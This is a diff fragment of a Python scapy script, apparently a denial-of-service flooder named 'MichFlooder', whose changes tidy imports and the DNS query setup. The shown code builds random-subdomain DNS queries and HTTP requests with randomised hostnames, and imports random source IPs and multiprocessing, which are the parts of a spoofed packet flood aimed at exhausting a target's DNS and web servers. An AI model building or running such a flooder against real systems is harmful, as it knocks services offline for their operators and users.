@@ -1,25 +1,25 @@
-import string
+from random import choices
 from datetime import timedelta
 from os import urandom, cpu_count
+from string import ascii_lowercase
 from argparse import ArgumentParser
 from multiprocessing import Process
-from random import choices
 from time import strftime, localtime, time
 
 from scapy.packet import Raw
 from scapy.sendrecv import send
 from scapy.layers.dns import DNS, DNSQR
-from scapy.volatile import RandInt, RandShort, RandChoice, RandIP, RandField
 from scapy.layers.inet import IP, TCP, UDP, ICMP
+from scapy.volatile import RandInt, RandShort, RandChoice, RandIP, RandField
 
 class RandSubDomainDNS(RandField):
     def __init__(self, domain):
         super(RandSubDomainDNS, self).__init__()
         self.domain = domain
-        self.dnsqr = DNSQR(qname=self.domain)
+        self.dnsqr = DNSQR()
 
     def _fix(self):
-        subdomain = "".join(choices(string.ascii_lowercase, k=5))
+        subdomain = "".join(choices(ascii_lowercase, k=5))
         self.dnsqr.qname = f"{subdomain}.{self.domain}"
         return self.dnsqr
 
@@ -31,7 +31,7 @@ class RandSubDomainHTTP(RandField):
         self.end="\r\nUser-Agent: MichFlooder\r\nConnection: close\r\n\r\n"
 
     def _fix(self):
-        subdomain = "".join(choices(string.ascii_lowercase, k=5))
+        subdomain = "".join(choices(ascii_lowercase, k=5))
         return self.start + f"{subdomain}.{self.domain}" + self.end
 
 class HashableRandIP(RandIP):
